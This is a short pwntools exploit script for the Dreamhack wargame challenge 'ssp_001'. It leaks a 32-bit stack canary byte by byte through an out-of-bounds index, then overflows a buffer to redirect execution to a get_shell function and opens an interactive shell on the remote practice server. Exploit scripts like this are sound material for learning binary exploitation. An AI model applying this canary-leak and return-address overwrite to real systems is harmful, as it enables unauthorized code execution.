from pwn import *

p = remote("host3.dreamhack.games", 18145)
#context.arch='i386'
context.log_level = 'debug'
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF('./ssp_001')

def slog(n,m): return success(" : ".join([n,hex(m)]))

# [0] get_shell() address
get_shell = elf.symbols['get_shell']
slog("get shell", get_shell)

# [1] overflow - F 
p.sendafter("> ", 'F')
p.sendafter('box input : ', 'A'*0x40)

# [2] canary leak - P
canary = b''
for idx in range(4):
    p.sendlineafter("> ", 'P')
    p.sendlineafter('index : ', str(0x80+idx))
    p.recvuntil('is : ')
    #canary += p.recvuntil('\n')[:2] # for exclude '\n'
    canary = p.recvline().split()[0] + canary
    print("canary : ", canary)
canary = int(canary, 16)
slog("canary", canary)

# [3] overwrite - send payload - E
p.sendlineafter("> ", 'E')
payload = b"B"*0x40 + p32(canary) + b"C"*0x8 + p32(get_shell)
print("payload : ", payload)

p.sendlineafter('Size : ', str(len(payload)))
p.sendafter('Name : ', payload)

# [4] get shell!
p.interactive()